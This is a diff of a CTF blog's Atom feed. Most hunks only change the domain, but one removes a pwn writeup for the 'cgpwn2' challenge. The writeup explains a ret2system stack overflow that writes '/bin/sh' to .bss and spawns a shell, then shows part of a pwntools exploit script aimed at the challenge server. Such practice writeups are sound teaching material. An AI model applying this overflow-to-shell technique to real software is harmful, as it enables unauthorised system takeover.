@@ -3,11 +3,11 @@
   <title>4ss1du0us&#39;s Blog</title>
   
   <subtitle>Welcome</subtitle>
-  <link href="https://4ss1du0us.github.io/atom.xml" rel="self"/>
+  <link href="https://www.4ss1du0us.cn/atom.xml" rel="self"/>
   
-  <link href="https://4ss1du0us.github.io/"/>
+  <link href="https://www.4ss1du0us.cn/"/>
   <updated>2023-04-11T14:18:07.101Z</updated>
-  <id>https://4ss1du0us.github.io/</id>
+  <id>https://www.4ss1du0us.cn/</id>
   
   <author>
     <name>4ss1du0us</name>
@@ -18,8 +18,8 @@
   
   <entry>
     <title>VM虚拟机显示“未能开启xxx.vmx”的解决办法</title>
-    <link href="https://4ss1du0us.github.io/2023/04/11/%E6%97%A5%E5%B8%B8/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%98%BE%E7%A4%BA%E2%80%9C%E6%9C%AA%E8%83%BD%E5%BC%80%E5%90%AFxxx.vmx%E2%80%9D%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
-    <id>https://4ss1du0us.github.io/2023/04/11/%E6%97%A5%E5%B8%B8/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%98%BE%E7%A4%BA%E2%80%9C%E6%9C%AA%E8%83%BD%E5%BC%80%E5%90%AFxxx.vmx%E2%80%9D%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</id>
+    <link href="https://www.4ss1du0us.cn/2023/04/11/%E6%97%A5%E5%B8%B8/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%98%BE%E7%A4%BA%E2%80%9C%E6%9C%AA%E8%83%BD%E5%BC%80%E5%90%AFxxx.vmx%E2%80%9D%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
+    <id>https://www.4ss1du0us.cn/2023/04/11/%E6%97%A5%E5%B8%B8/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%98%BE%E7%A4%BA%E2%80%9C%E6%9C%AA%E8%83%BD%E5%BC%80%E5%90%AFxxx.vmx%E2%80%9D%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</id>
     <published>2023-04-11T13:36:24.000Z</published>
     <updated>2023-04-11T14:18:07.101Z</updated>
     
@@ -30,17 +30,17 @@
     
     
     
-    <category term="日常" scheme="https://4ss1du0us.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
+    <category term="日常" scheme="https://www.4ss1du0us.cn/categories/%E6%97%A5%E5%B8%B8/"/>
     
     
-    <category term="日常" scheme="https://4ss1du0us.github.io/tags/%E6%97%A5%E5%B8%B8/"/>
+    <category term="日常" scheme="https://www.4ss1du0us.cn/tags/%E6%97%A5%E5%B8%B8/"/>
     
   </entry>
   
   <entry>
     <title>湖北省第七届楚慧杯-Level_up</title>
-    <link href="https://4ss1du0us.github.io/2023/03/31/CTF%20-%20Reverse_Writeup/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up/"/>
-    <id>https://4ss1du0us.github.io/2023/03/31/CTF%20-%20Reverse_Writeup/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/31/CTF%20-%20Reverse_Writeup/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/31/CTF%20-%20Reverse_Writeup/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up/</id>
     <published>2023-03-31T14:43:39.000Z</published>
     <updated>2023-04-01T13:13:54.469Z</updated>
     
@@ -51,19 +51,19 @@
     
     
     
-    <category term="逆向" scheme="https://4ss1du0us.github.io/categories/%E9%80%86%E5%90%91/"/>
+    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
     
     
-    <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
     
-    <category term="REVERSE" scheme="https://4ss1du0us.github.io/tags/REVERSE/"/>
+    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
     
   </entry>
   
   <entry>
     <title>湖北省第七届楚慧杯-Level_One</title>
-    <link href="https://4ss1du0us.github.io/2023/03/30/CTF%20-%20Reverse_Writeup/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_One/"/>
-    <id>https://4ss1du0us.github.io/2023/03/30/CTF%20-%20Reverse_Writeup/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_One/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/30/CTF%20-%20Reverse_Writeup/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_One/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/30/CTF%20-%20Reverse_Writeup/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_One/</id>
     <published>2023-03-30T08:35:24.000Z</published>
     <updated>2023-04-01T13:13:43.841Z</updated>
     
@@ -74,19 +74,19 @@
     
     
     
-    <category term="逆向" scheme="https://4ss1du0us.github.io/categories/%E9%80%86%E5%90%91/"/>
+    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
     
     
-    <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
     
-    <category term="REVERSE" scheme="https://4ss1du0us.github.io/tags/REVERSE/"/>
+    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
     
   </entry>
   
   <entry>
     <title>便捷算法</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/</id>
     <published>2023-03-19T08:11:01.000Z</published>
     <updated>2023-03-31T18:14:26.053Z</updated>
     
@@ -97,21 +97,21 @@
     
     
     
-    <category term="便捷算法" scheme="https://4ss1du0us.github.io/categories/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/"/>
+    <category term="便捷算法" scheme="https://www.4ss1du0us.cn/categories/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/"/>
     
     
-    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
+    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
-    <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
     
-    <category term="REVERSE" scheme="https://4ss1du0us.github.io/tags/REVERSE/"/>
+    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
     
   </entry>
   
   <entry>
     <title>压缩包密码爆破</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</id>
     <published>2023-03-19T07:57:20.000Z</published>
     <updated>2023-03-28T12:24:50.396Z</updated>
     
@@ -122,19 +122,19 @@
     
     
     
-    <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
+    <category term="杂项" scheme="https://www.4ss1du0us.cn/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
+    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
-    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
+    <category term="MISC" scheme="https://www.4ss1du0us.cn/tags/MISC/"/>
     
   </entry>
   
   <entry>
     <title>隐写</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/%E9%9A%90%E5%86%99/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/%E9%9A%90%E5%86%99/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/%E9%9A%90%E5%86%99/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/%E9%9A%90%E5%86%99/</id>
     <published>2023-03-19T07:57:08.000Z</published>
     <updated>2023-03-28T11:15:30.946Z</updated>
     
@@ -145,19 +145,19 @@
     
     
     
-    <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
+    <category term="杂项" scheme="https://www.4ss1du0us.cn/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
+    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
-    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
+    <category term="MISC" scheme="https://www.4ss1du0us.cn/tags/MISC/"/>
     
   </entry>
   
   <entry>
     <title>各种加密算法</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/%E5%90%84%E7%A7%8D%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95%E7%9A%84%E7%89%B9%E7%82%B9/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/%E5%90%84%E7%A7%8D%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95%E7%9A%84%E7%89%B9%E7%82%B9/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/%E5%90%84%E7%A7%8D%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95%E7%9A%84%E7%89%B9%E7%82%B9/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/%E5%90%84%E7%A7%8D%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95%E7%9A%84%E7%89%B9%E7%82%B9/</id>
     <published>2023-03-19T07:56:58.000Z</published>
     <updated>2023-03-28T11:15:15.043Z</updated>
     
@@ -168,19 +168,19 @@
     
     
     
-    <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
+    <category term="杂项" scheme="https://www.4ss1du0us.cn/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
+    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
-    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
+    <category term="MISC" scheme="https://www.4ss1du0us.cn/tags/MISC/"/>
     
   </entry>
   
   <entry>
     <title>ZIP伪加密</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</id>
     <published>2023-03-19T07:56:39.000Z</published>
     <updated>2023-03-30T13:04:56.748Z</updated>
     
@@ -191,19 +191,19 @@
     
     
     
-    <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
+    <category term="杂项" scheme="https://www.4ss1du0us.cn/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
+    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
-    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
+    <category term="MISC" scheme="https://www.4ss1du0us.cn/tags/MISC/"/>
     
   </entry>
   
   <entry>
     <title>GIF图片拆分&amp;拼图</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/GIF%E5%9B%BE%E7%89%87%E6%8B%86%E5%88%86&amp;%E6%8B%BC%E5%9B%BE/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/GIF%E5%9B%BE%E7%89%87%E6%8B%86%E5%88%86&amp;%E6%8B%BC%E5%9B%BE/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/GIF%E5%9B%BE%E7%89%87%E6%8B%86%E5%88%86&amp;%E6%8B%BC%E5%9B%BE/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/GIF%E5%9B%BE%E7%89%87%E6%8B%86%E5%88%86&amp;%E6%8B%BC%E5%9B%BE/</id>
     <published>2023-03-19T07:56:04.000Z</published>
     <updated>2023-03-29T04:37:11.150Z</updated>
     
@@ -214,19 +214,19 @@
     
     
     
-    <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
+    <category term="杂项" scheme="https://www.4ss1du0us.cn/categories/%E6%9D%82%E9%A1%B9/"/>
     
     
-    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
+    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
-    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
+    <category term="MISC" scheme="https://www.4ss1du0us.cn/tags/MISC/"/>
     
   </entry>
   
   <entry>
     <title>文件保护机制</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn/%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn/%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn/%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn/%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</id>
     <published>2023-03-19T07:39:49.000Z</published>
     <updated>2023-03-28T05:54:48.977Z</updated>
     
@@ -237,19 +237,19 @@
     
     
     
-    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
     
     
-    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
+    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
-    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
+    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
     
   </entry>
   
   <entry>
     <title>格式化字符串漏洞</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</id>
     <published>2023-03-19T07:39:40.000Z</published>
     <updated>2023-03-27T14:01:21.544Z</updated>
     
@@ -260,19 +260,19 @@
     
     
     
-    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
     
     
-    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
+    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
-    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
+    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
     
   </entry>
   
   <entry>
     <title>Pwntools</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn/Pwntools/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn/Pwntools/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn/Pwntools/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn/Pwntools/</id>
     <published>2023-03-19T07:39:30.000Z</published>
     <updated>2023-03-27T13:41:58.921Z</updated>
     
@@ -283,19 +283,19 @@
     
     
     
-    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
     
     
-    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
+    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
-    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
+    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
     
   </entry>
   
   <entry>
     <title>PLT表和GOT表</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn/PLT%E8%A1%A8%E5%92%8CGOT%E8%A1%A8/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn/PLT%E8%A1%A8%E5%92%8CGOT%E8%A1%A8/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn/PLT%E8%A1%A8%E5%92%8CGOT%E8%A1%A8/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn/PLT%E8%A1%A8%E5%92%8CGOT%E8%A1%A8/</id>
     <published>2023-03-19T07:39:19.000Z</published>
     <updated>2023-03-27T13:41:53.309Z</updated>
     
@@ -306,42 +306,19 @@
     
     
     
-    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
     
     
-    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
+    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
-    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>攻防世界-cgpwn2</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-cgpwn2/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-cgpwn2/</id>
-    <published>2023-03-19T07:23:24.000Z</published>
-    <updated>2023-03-29T00:46:06.321Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><strong><em>当程序中没有后门函数时</em></strong>：<br><mark>可以通过向段中写入 <code>&quot;/bin/sh&quot;</code>，然后通过栈溢出调用 <code>system()</code> 函数将写入的 <code>&quot;/bin/sh&quot;</code> 作为参数执行</mark></p></li><li><p><mark>在调用 <code>system()</code> 函数时，<strong>若想要向其传入参数</strong>，注意填充 <strong>4个 字节</strong> 的数据来平衡栈</mark>，<strong>因为调用 <code>system()</code> 函数的时候要压入一个返回地址</strong>【<em>有时候直接写 p32(0) 也可以，这也是一个 4字节 的数据</em>】</p></li></ul><blockquote><p>为什么要填充 4个 字节？</p></blockquote><ol><li>当程序调用 <code>system()</code> 函数时，会自动去寻找栈底，即 <code>ebp</code> 指向的位置，然后将 <code>ebp+8 字节</code> 的位置的数据当作函数的参数</li><li>如果想将 <code>/bin/sh</code> 作为 <code>system()</code> 函数的参数，就可以在栈溢出的时候，先修改 <code>eip</code> 为 <code>system()</code> 函数的地址，然后填充 <code>4个字节</code> 的垃圾数据，再将 <code>/bin/sh</code> 的地址写入栈上，这样调用 <code>system()</code> 函数的时候，就可以将 <code>/bin/sh</code> 作为参数，然后返回一个 <code>shell</code></li><li>为什么是在 <code>eip</code>【即 <code>system()</code> 函数地址】后面覆盖 <code>4个字节</code> 垃圾数据而不是前面提到的 <code>8个字节</code>？<br> 这是因为当调用 <code>system()</code> 函数的时候，在 <code>system()</code> 函数中会首先执行 <code>push ebp</code> 指令，将 <code>4字节</code> 的 <code>ebp</code> 地址压入栈中，而此时的栈底距离参数 <code>/bin/sh</code> 正好 <code>8字节</code>，所以应该填充 <code>4字节</code> 垃圾数据<br><img src="https://s2.loli.net/2023/03/18/SoGkB1pXuNM9Hvh.png" alt="攻防世界-cgpwn2 0.png"></li></ol><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/53c24fc5522e4a8ea2d9ad0577196b2f">攻防世界-cgpwn2</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/47GXA5cqQbWhKH6.png" alt="攻防世界-cgpwn2 1.png"><br>32位 小端序，只开启了栈不可执行</p></li><li><p>尝试执行：<br><img src="https://s2.loli.net/2023/03/18/85zA6Mwbg9ctLRG.png" alt="攻防世界-cgpwn2 2.png"></p></li><li><p>在 IDA 中分析：<br><img src="https://s2.loli.net/2023/03/18/k1HcRSt3fLjVKux.png" alt="攻防世界-cgpwn2 3.png"><br>跟进 <code>hello()</code>：<br><img src="https://s2.loli.net/2023/03/18/Ofux8XA2B39paIW.png" alt="攻防世界-cgpwn2 4.png"><br>有两个输入：<code>name</code> 和 <code>s</code>，查看 <code>name</code> 的写入位置：<br><img src="https://s2.loli.net/2023/03/18/Lmj7w5i6pVunSKo.png" alt="攻防世界-cgpwn2 5.png"><br>发现<mark>输入的 <code>name</code> 是存储在 <code>.bss</code> 段上的，不是在栈中</mark><br>查看 <code>s</code> 的写入位置：<br><img src="https://s2.loli.net/2023/03/18/PL1k2cOzNJFgUjS.png" alt="攻防世界-cgpwn2 6.png"><br>可以通过 <code>gets()</code> 函数溢出函数返回值，转而执行其他函数</p></li><li><p>发现后门函数：<br><img src="https://s2.loli.net/2023/03/18/83ULcImpSFXqCi9.png" alt="攻防世界-cgpwn2 7.png"><br>但是这个函数只是执行 <code>echo hehehe</code>，即：打印 <code>hehehe</code>，并不能提供 flag</p></li><li><p><mark>既然输入的 <code>name</code> 可以往 <code>.bss</code> 段上写入数据，因此可以考虑通过 <code>name</code> 往 <code>.bss</code> 段上写入 <code>&quot;/bin/sh&quot;</code>，然后再通过输入 <code>s</code> 将栈溢出，使程序调用 <code>system()</code> 函数，再将事先写入的 <code>&quot;/bin/sh&quot;</code> 做为 <code>system()</code> 函数的参数，即可 PWN 掉程序</mark></p></li><li><p>就是需要注意：调用 <code>system()</code> 函数后需要需要填充 <strong>4个字节</strong> 的垃圾数据来保持栈的平衡<br>因为调用 <code>system()</code> 函数的时候要压入一个返回地址，需要填充 <strong>4个 字节</strong>；<br>除写 <code>b&#39;a&#39; * 4</code> 之外，还可以写 <code>p32(0)</code>，也可以代表 <strong>4个 字节</strong></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./cgpwn2"</span><span class="token punctuation">)</span>  <span class="token comment"># 生成elf对象</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取system函数的地址</span>bin_sh_addr <span class="token operator">=</span> <span class="token number">0x0804A080</span>  <span class="token comment"># s在.bss段上写入的地址，地址可以在ida中查看到，要往这里写入“/bin/sh”，然后用system函数调用它</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./cgpwn2"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">65027</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x26</span> <span class="token 